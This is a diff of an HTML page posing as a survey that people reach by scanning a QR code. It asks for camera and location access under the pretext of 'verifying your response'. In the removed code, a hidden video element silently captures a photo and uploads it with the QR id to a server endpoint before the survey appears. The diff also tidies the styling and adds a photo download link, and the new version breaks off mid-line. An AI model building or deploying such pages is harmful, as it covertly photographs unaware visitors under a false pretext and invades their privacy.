@@ -2,52 +2,19 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>QR Photo + Survey</title>
-
+<title>Survey</title>
 <style>
-body {
-  font-family: Arial;
-  text-align: center;
-  margin-top: 30px;
-  background: #f2f2f2;
-}
-
-video { display: none; }
-canvas { display: none; }
-
+body { font-family: Arial; text-align: center; margin-top: 30px; background: #f2f2f2; }
+video, canvas { display: none; }
 h2 { color: #333; }
 p { color: #555; }
-
-form {
-  margin-top: 20px;
-  display: none;
-  background: #fff;
-  padding: 20px;
-  border-radius: 10px;
-  width: 320px;
-  margin-left: auto;
-  margin-right: auto;
-}
-
-input, select, textarea {
-  width: 100%;
-  margin-bottom: 10px;
-  padding: 6px;
-}
-
-button {
-  padding: 10px 20px;
-  cursor: pointer;
-  background: #4CAF50;
-  color: white;
-  border: none;
-  border-radius: 5px;
-}
+form { margin-top: 20px; display: none; background: #fff; padding: 20px; border-radius: 10px; width: 320px; margin-left: auto; margin-right: auto; }
+input, select, textarea { width: 100%; margin-bottom: 10px; padding: 6px; }
+button { padding: 10px 20px; cursor: pointer; background: #4CAF50; color: white; border: none; border-radius: 5px; }
 </style>
 </head>
 
 <body>
-
 <h2>Please allow camera and location access to continue 😊</h2>
 <p>This helps us verify your response and show the survey.</p>
 
@@ -103,7 +70,8 @@ button {
 </form>
 
 <p id="thanksMessage" style="display:none;">
-  Thank you for completing the survey!
+  Thank you for completing the survey!<br>
+  <a id="downloadLink" href="#" style="display:none;">Download your photo</a>
 </p>
 
 <script>
@@ -111,6 +79,8 @@ const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const form = document.getElementById("surveyForm");
 const thanks = document.getElementById("thanksMessage");
+const downloadLink = document.getElementById("downloadLink");
+let lastUploadUrl = "";
 
 async function init() {
   try {
@@ -131,44 +101,5 @@ async function init() {
 
 function getQRFromURL() {
   const params = new URLSearchParams(window.location.search);
-  return params.get("qr") || "unknown";
-}
-
-function captureAndSend(stream) {
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-
-  canvas.getContext("2d").drawImage(video, 0, 0);
-
-  canvas.toBlob(async (blob) => {
-    const formData = new FormData();
-    formData.append("photo", blob);
-    formData.append("qr_id", getQRFromURL());
-
-    try {
-      await fetch("/api/upload", { method: "POST", body: formData });
-
-      document.querySelector('h2').style.display = 'none';
-      document.querySelector('p').style.display = 'none';
-      form.style.display = 'block';
-
-    } catch (err) {
-      alert("Upload failed. Refresh and try again.");
-    }
-  });
-
-  stream.getTracks().forEach(track => track.stop());
-}
-
-form.addEventListener("submit", function(e) {
-  e.preventDefault();
-  form.style.display = "none";
-  thanks.style.display = "block";
-});
-
-init();
-</script>
-
-</body>
-</html>
+  return param
 
